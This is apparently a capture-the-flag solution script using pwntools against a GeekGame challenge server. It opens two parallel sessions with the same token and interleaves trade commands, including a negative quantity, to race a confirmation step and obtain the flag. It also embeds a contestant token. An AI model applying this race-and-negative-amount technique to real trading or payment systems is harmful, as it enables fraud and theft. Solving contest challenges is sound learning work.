# Author: Xzonn
# Date: 2021-05-23

from pwn import *

context.log_level="debug"

r = remote("prob03.geekgame.pku.edu.cn", 10003)
r.recvuntil("token: ")
r.sendline("178:MEYCIQC7a4TTWnnTSTX0Jxfh5z09AbIVnIsM4XLG2SpeX7E6PwIhAM4O+uTvHsI+ZjmONZDBZxC/Ytjdeu+HPaPvkVHr1E7x")
r.recvuntil("> ")
r.sendline("trade")
r.sendline("citrine 0")
r.sendline("END")
r.recvuntil("Type 'y' to confirm: ")

r2 = remote("prob03.geekgame.pku.edu.cn", 10003)
r2.recvuntil("token: ")
r2.sendline("178:MEYCIQC7a4TTWnnTSTX0Jxfh5z09AbIVnIsM4XLG2SpeX7E6PwIhAM4O+uTvHsI+ZjmONZDBZxC/Ytjdeu+HPaPvkVHr1E7x")
r2.recvuntil("> ")
r2.sendline("trade")
r2.sendline("flag -2")
r2.sendline("END")
r2.recvuntil("> ")

r.sendline("y")
r.recvuntil("> ")
r.sendline("trade")
r.sendline("citrine 0")
r.sendline("END")
r.recvuntil("Type 'y' to confirm: ")

r2.sendline("trade")
r2.sendline("flag 1")
r2.sendline("END")
r2.recvuntil("> ")

r.sendline("y")
r.sendline("inspect")
r.interactive()